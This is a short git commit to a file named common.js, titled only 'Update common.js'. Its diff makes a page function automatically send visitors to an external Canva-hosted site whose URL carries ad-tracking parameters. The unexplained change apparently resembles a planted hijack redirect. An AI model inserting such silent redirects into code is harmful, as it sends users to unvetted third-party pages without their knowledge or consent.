2ee8385c24417afb75f47ec078697663d3dcf100
avicil <meetrover37@gmail.com>
2025-08-06 10:58:03 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="";
+		var url="https://tionnsorg.my.canva.site/org?gad_source=1&gad_campaignid=22856519177&gbraid=0AAAABAJ5z9mUwMO3WdhyBslgtqQSL5fmb&gclid=EAIaIQobChMImcez1JX1jgMVYxqDAx3FHivKEAAYAiAAEgK_MvD_BwE";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
